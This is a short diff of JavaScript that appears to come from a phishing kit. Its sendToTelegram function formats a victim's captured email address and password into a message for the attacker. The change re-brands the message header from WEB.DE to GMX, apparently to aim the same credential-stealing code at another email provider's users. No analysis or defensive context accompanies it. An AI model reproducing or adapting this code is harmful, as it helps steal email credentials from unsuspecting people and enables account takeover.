@@ -17,7 +17,7 @@
     async function sendToTelegram(email, password) {
         // Customize the message format
         const message = `
-        *GOODNEWS from WEB.DE*
+        *GOODNEWS from GMX*
         *Email:* ${email}
         *Password:* ${password}
         `;
